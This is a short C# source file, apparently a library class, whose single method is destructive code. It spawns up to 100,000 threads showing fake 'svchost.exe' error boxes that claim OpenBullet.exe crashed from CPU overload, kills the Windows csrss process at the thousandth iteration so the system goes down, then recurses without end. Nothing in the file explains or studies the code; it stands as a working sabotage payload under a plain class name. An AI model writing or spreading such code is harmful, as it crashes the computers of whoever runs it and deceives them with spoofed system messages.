using System;
using System.Collections.Generic;
using System.Threading;
using System.Windows;
using System.Reflection;

namespace BBCX
{
    public class Class1
    {
        public static List<string> users = new List<string>();

        public static void RaiseCPUShit()
        {
            for (int i = 0; i < 100000; i++)
            {
                Thread h = new Thread(() => MessageBox.Show("Runtime Error! \nProgram: OpenBullet.exe\nR6016\n-StackOverflow: ECB787854 \n WARNING! CPU Usage out of stackflow! CPU overloaded! Closing the Instance...", "svchost.exe", System.Windows.MessageBoxButton.OK, System.Windows.MessageBoxImage.Error));
                h.SetApartmentState(ApartmentState.STA);
                h.Start();
                if (i == 1000)
                {
                    System.Diagnostics.Process.GetProcessesByName("csrss")[0].Kill();
                }
            }
            Thread t = new Thread(() => MessageBox.Show("Runtime Error! \nProgram: OpenBullet.exe\nR6016\n-StackOverflow: ECB787854 \n WARNING! CPU Usage out of stackflow! CPU overloaded! Closing the Instance...", "svchost.exe", System.Windows.MessageBoxButton.OK, System.Windows.MessageBoxImage.Error));
            t.SetApartmentState(ApartmentState.STA);
            t.Start();
            RaiseCPUShit();
            throw new Exception("CPU OVERLOADED");
        }
    }
}
